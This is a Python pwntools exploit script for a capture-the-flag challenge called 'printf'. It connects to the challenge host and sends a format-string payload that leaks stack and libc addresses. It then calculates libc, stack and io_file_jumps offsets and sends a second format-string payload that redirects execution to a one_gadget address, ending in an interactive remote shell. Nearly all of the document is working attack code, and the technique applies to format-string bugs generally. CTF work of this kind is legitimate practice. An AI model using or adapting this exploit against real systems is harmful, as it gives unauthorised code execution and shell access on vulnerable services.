from pwn import *
from pwn_debug.pwn_debug import *
context.log_level = 'debug'

TARGET = "./printf"
LIBC = "./libc.so.6"
# LIBC = "/lib/x86_64-linux-gnu/libc-2.29.so"
elf = ELF(TARGET)
libc = ELF(LIBC) 

HOST = 'printf.chal.ctf.westerns.tokyo'
PORT = 10001

pdbg = pwn_debug(TARGET)
pdbg.local(LIBC) 
# r = pdbg.run("local")
r = remote(HOST, PORT)
# r = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./printf"])

# bp, fork-mode, command
# pdbg.bp([0x2940, 0x27b5], 'parent', ['c'])
# pdbg.bp([0x1c85, 0x2940], 'parent', ['c'])

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r.recvuntil('name?\n')
payload = ''
payload += '%lx, '* 43
payload += 'A'
r.send(payload) 

leak = r.recvuntil('comment?\n').split('\n')[1].split(', ')

print leak
for i in range(43):
    print str(i).zfill(2), "|", leak[i]

# canary = int(leak[40], 16)
libc = int(leak[42], 16) - 0x26b6b 
rsp = int(leak[39], 16) - 0x380 
io_file_jumps = libc + 0x1e6560

gadget = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]

target = rsp - io_file_jumps
dbg("libc")
dbg("rsp")
dbg("io_file_jumps")
dbg("target")

payload = ''
payload += '%'
payload += str(target-0x30)
payload += 'c'
payload += 'A'*7
payload += p64(0x1111111111111111)
payload += p64(0x2222222222222222)
payload += p64(libc + gadget[3]).strip('\x00')

r.send(payload) 

r.interactive()


